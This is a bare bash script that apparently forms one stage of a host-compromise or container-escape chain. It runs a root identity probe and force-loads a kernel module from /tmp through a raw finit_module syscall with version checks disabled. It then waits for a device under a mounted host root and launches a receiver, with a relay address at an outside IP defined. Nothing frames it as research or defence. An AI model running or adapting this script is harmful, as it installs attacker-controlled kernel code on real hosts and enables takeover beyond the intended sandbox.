#!/bin/bash
set +e
relay=http://16.146.243.72:8450

run=$(cat /tmp/vmbfs-b-run 2>/dev/null)
slot=$(cat /tmp/vmbfs-b-slot 2>/dev/null)
python3 /tmp/root_identity_probe.py >/tmp/root-identity.json 2>/tmp/root-identity.err

python3 - <<'PY'
import ctypes
import os

fd = os.open("/tmp/hvraw_vmbfs_receiver.ko", os.O_RDONLY)
libc = ctypes.CDLL(None, use_errno=True)
result = libc.syscall(313, fd, b"", 3)
print("VMBFS_RECEIVER_FINIT result=%d errno=%d" %
      (result, ctypes.get_errno()))
os.close(fd)
PY

for attempt in $(seq 1 50); do
  test -c /hostroot/dev/hvrawvmbfs && break
  sleep 0.1
done
if ! test -c /hostroot/dev/hvrawvmbfs; then
  printf 'VMBFS_RECEIVER_DEVICE missing\n'
  exit 30
fi
exec python3 -u /tmp/vmbfs_receiver.py "$run" "$slot"
